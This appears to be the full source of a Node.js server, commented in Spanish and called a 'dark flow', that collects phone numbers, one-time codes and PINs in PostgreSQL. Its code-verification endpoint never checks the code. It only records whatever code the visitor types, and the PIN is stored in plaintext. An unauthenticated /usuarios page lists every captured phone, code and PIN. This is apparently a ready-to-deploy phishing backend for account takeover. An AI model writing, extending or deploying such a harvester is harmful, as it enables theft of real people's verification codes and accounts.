/**
 * server.js
 * Backend del flujo oscuro (teléfono -> código -> PIN).
 * Guarda el teléfono en cuanto se pide el código, y actualiza esa misma
 * fila con el código usado, en una base de datos PostgreSQL real.
 *
 * Instala con:
 *   npm install
 *
 * Corre con:
 *   node server.js
 *
 * Variables de entorno necesarias (Railway las pone solas):
 *   DATABASE_URL   -> viene del servicio de Postgres
 *   PORT           -> viene de Railway automáticamente
 */

const express = require("express");
const path = require("path");
const { Pool } = require("pg");

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "flujo-dark.html"));
});
app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "flujo-dark.html"));
});

// ---- Conexión a la base de datos ----
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
});

async function crearTablaSiNoExiste() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS usuarios (
      id SERIAL PRIMARY KEY,
      telefono TEXT UNIQUE NOT NULL,
      ultimo_codigo_usado TEXT,
      pin TEXT,
      creado_en TIMESTAMP DEFAULT NOW(),
      ultimo_acceso TIMESTAMP DEFAULT NOW()
    );
  `);

  // Por si la tabla ya existía de antes (de antes de que agregáramos el PIN),
  // esto le agrega la columna sin borrar los datos que ya tenías.
  await pool.query(`
    ALTER TABLE usuarios ADD COLUMN IF NOT EXISTS pin TEXT;
  `);
}

const codigosActivos = {};

function generarCodigo() {
  return String(Math.floor(100000 + Math.random() * 900000));
}

// Paso 1: guarda el teléfono de inmediato, con el código en blanco
app.post("/api/enviar-otp", async (req, res) => {
  const { telefono } = req.body;

  if (!telefono) {
    return res.status(400).json({ error: "Falta el número de teléfono" });
  }

  const codigo = generarCodigo();
  codigosActivos[telefono] = codigo;

  console.log(`>>> Código para ${telefono}: ${codigo}`);

  try {
    await pool.query(
      `INSERT INTO usuarios (telefono, ultimo_codigo_usado, ultimo_acceso)
       VALUES ($1, NULL, NOW())
       ON CONFLICT (telefono)
       DO UPDATE SET ultimo_acceso = NOW()`,
      [telefono]
    );
    res.json({ ok: true });
  } catch (error) {
    console.error("Error guardando el teléfono:", error.message);
    res.status(500).json({ error: "No se pudo guardar" });
  }
});

// Paso 2: actualiza esa misma fila con el código usado
app.post("/api/verificar-otp", async (req, res) => {
  const { telefono, codigo } = req.body;

  if (!telefono || !codigo) {
    return res.status(400).json({ error: "Faltan datos" });
  }

  try {
    await pool.query(
      `UPDATE usuarios
       SET ultimo_codigo_usado = $2, ultimo_acceso = NOW()
       WHERE telefono = $1`,
      [telefono, codigo]
    );

    delete codigosActivos[telefono];
    res.json({ ok: true });
  } catch (error) {
    console.error("Error guardando el código:", error.message);
    res.status(500).json({ error: "No se pudo guardar" });
  }
});

// Paso 3: guardar el PIN que haya puesto el usuario
app.post("/api/guardar-pin", async (req, res) => {
  const { telefono, pin } = req.body;

  if (!telefono || !pin) {
    return res.status(400).json({ error: "Faltan datos" });
  }

  try {
    await pool.query(
      `UPDATE usuarios
       SET pin = $2, ultimo_acceso = NOW()
       WHERE telefono = $1`,
      [telefono, pin]
    );

    res.json({ ok: true });
  } catch (error) {
    console.error("Error guardando el PIN:", error.message);
    res.status(500).json({ error: "No se pudo guardar" });
  }
});

// ---- Ver todos los usuarios como tabla ----
app.get("/usuarios", async (req, res) => {
  const resultado = await pool.query("SELECT * FROM usuarios ORDER BY id ASC");
  const usuarios = resultado.rows;

  const filas = usuarios
    .map(
      (u) => `
        <tr>
          <td>${u.id}</td>
          <td>${u.telefono}</td>
          <td>${u.ultimo_codigo_usado || ""}</td>
          <td>${u.pin || ""}</td>
          <td>${new Date(u.creado_en).toLocaleString("es-MX")}</td>
          <td>${new Date(u.ultimo_acceso).toLocaleString("es-MX")}</td>
        </tr>`
    )
    .join("");

  res.send(`
    <!DOCTYPE html>
    <html lang="es-MX">
    <head>
      <meta charset="UTF-8" />
      <title>Usuarios registrados</title>
      <style>
        body { font-family: -apple-system, sans-serif; padding: 32px; background: #0d0d12; color: #fff; }
        table { border-collapse: collapse; width: 100%; margin-top: 16px; }
        th, td { border: 1px solid #2a2a35; padding: 10px 12px; text-align: left; font-size: 14px; }
        th { background: #17171f; }
        tr:nth-child(even) { background: #121218; }
      </style>
    </head>
    <body>
      <h1>Usuarios registrados (${usuarios.length})</h1>
      <table>
        <thead>
          <tr><th>ID</th><th>Teléfono</th><th>Último código</th><th>PIN</th><th>Creado</th><th>Último acceso</th></tr>
        </thead>
        <tbody>${filas || `<tr><td colspan="6">Aún no hay usuarios</td></tr>`}</tbody>
      </table>
    </body>
    </html>
  `);
});

const PUERTO = process.env.PORT || 3000;

crearTablaSiNoExiste()
  .then(() => {
    app.listen(PUERTO, () => {
      console.log(`Servidor corriendo en http://localhost:${PUERTO}`);
    });
  })
  .catch((error) => {
    console.error("Error creando la tabla:", error.message);
  });
